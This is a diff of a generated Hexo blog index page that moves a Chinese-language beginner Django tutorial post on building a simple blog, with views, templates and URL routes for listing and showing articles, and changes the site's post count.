 </blockquote>
+</li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django---简单博客搭建（2）/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="wcute">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo Test">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/12/09/python/Django---简单博客搭建（2）/" itemprop="url">Untitled</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
+                2018-12-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="博客页面分类："><a href="#博客页面分类：" class="headerlink" title="博客页面分类："></a>博客页面分类：</h4><p>1.博客主页面<br>2.博客文章内容页面<br>3.博客撰写页面</p>
+<h4 id="主页面内容："><a href="#主页面内容：" class="headerlink" title="主页面内容："></a>主页面内容：</h4><ol>
+<li>文章标题列表，超链接</li>
+<li>取出数据库中所有文章对象</li>
+<li>将文章对象打包成列表，传递到前端</li>
+<li>前端页面把文章以标题超链接的形式逐个列出</li>
+</ol>
+<ul>
+<li><p>后端 views.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line"># 获取所有文章</span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>前端 index.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--撰写博客入口--&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文章列表--&gt;</span><br><span class="line">&lt;h3&gt;</span><br><span class="line">文章列表：&lt;br&gt;</span><br><span class="line">&#123;% for article in articles %&#125;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="发表博客按钮（超链接）博客文章内容页面"><a href="#发表博客按钮（超链接）博客文章内容页面" class="headerlink" title="发表博客按钮（超链接）博客文章内容页面"></a>发表博客按钮（超链接）博客文章内容页面</h4><ol>
+<li>利用文章 ID 获取单个文章对象</li>
+</ol>
+<ul>
+<li>后端 view.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br><span class="line"></span><br><span class="line"># 获取文章对象</span><br><span class="line">def article_page(request,article_id):</span><br><span class="line">article = models.Article.objects.get(pk=article_id)</span><br><span class="line">return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;)</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="2">
+<li>编写显示文章内容页面的前端</li>
+</ol>
+<ul>
+<li>前端 articl_page.html<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--显示单个文章标题和内容--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;!--修改文章链接--&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<ol start="3">
+<li>修改 URL 配置</li>
+</ol>
+<ul>
+<li>urls.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&apos;^index/$&apos;, views.index), </span><br><span class="line">url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), </span><br><span class="line">]</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
 
@@ -1969,161 +2117,6 @@ if __name__==&quot;__main__&quot;:
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://wcute.github.io/2018/12/09/python/Django---简单博客搭建（2）/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="wcute">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo Test">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/12/09/python/Django---简单博客搭建（2）/" itemprop="url">Untitled</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-09T11:50:55+08:00">
-                2018-12-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="博客页面分类："><a href="#博客页面分类：" class="headerlink" title="博客页面分类："></a>博客页面分类：</h4><p>1.博客主页面<br>2.博客文章内容页面<br>3.博客撰写页面</p>
-<h4 id="主页面内容："><a href="#主页面内容：" class="headerlink" title="主页面内容："></a>主页面内容：</h4><ol>
-<li>文章标题列表，超链接</li>
-<li>取出数据库中所有文章对象</li>
-<li>将文章对象打包成列表，传递到前端</li>
-<li>前端页面把文章以标题超链接的形式逐个列出</li>
-</ol>
-<ul>
-<li><p>后端 views.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line"># 获取所有文章</span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>前端 index.html</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--撰写博客入口--&gt;</span><br><span class="line">&lt;h2&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;编写新文章&lt;/a&gt;</span><br><span class="line">&lt;/h2&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文章列表--&gt;</span><br><span class="line">&lt;h3&gt;</span><br><span class="line">文章列表：&lt;br&gt;</span><br><span class="line">&#123;% for article in articles %&#125;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;&#123;&#123; article.title &#125;&#125;&lt;/a&gt;</span><br><span class="line">&lt;br/&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="发表博客按钮（超链接）博客文章内容页面"><a href="#发表博客按钮（超链接）博客文章内容页面" class="headerlink" title="发表博客按钮（超链接）博客文章内容页面"></a>发表博客按钮（超链接）博客文章内容页面</h4><ol>
-<li>利用文章 ID 获取单个文章对象</li>
-</ol>
-<ul>
-<li>后端 view.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.shortcuts import render</span><br><span class="line">from django.http import HttpResponse</span><br><span class="line">from . import models</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">articles = models.Article.objects.all() # 返回django内置的查询结果的集合对象，类似于列表</span><br><span class="line">return render(request,&apos;blog/index.html&apos;,&#123;&apos;articles&apos;:articles&#125;)</span><br><span class="line"></span><br><span class="line"># 获取文章对象</span><br><span class="line">def article_page(request,article_id):</span><br><span class="line">article = models.Article.objects.get(pk=article_id)</span><br><span class="line">return render(request,&apos;blog/article_page.html&apos;,&#123;&apos;article&apos;:article&#125;)</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol start="2">
-<li>编写显示文章内容页面的前端</li>
-</ol>
-<ul>
-<li>前端 articl_page.html<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--显示单个文章标题和内容--&gt;</span><br><span class="line">&lt;h1&gt;&#123;&#123;article.title&#125;&#125;&lt;/h1&gt;&lt;br&gt;</span><br><span class="line">&lt;h3&gt;&#123;&#123;article.content&#125;&#125;&lt;/h3&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;!--修改文章链接--&gt;</span><br><span class="line">&lt;a href=&quot;&quot;&gt;修改文章&lt;/a&gt;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<ol start="3">
-<li>修改 URL 配置</li>
-</ol>
-<ul>
-<li>urls.py<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">url(r&apos;^index/$&apos;, views.index), </span><br><span class="line">url(r&apos;^article/(?P&lt;article_id&gt;[0-9]+)$&apos;, views.article_page), </span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2174,7 +2167,7 @@ if __name__==&quot;__main__&quot;:
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-count">26</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
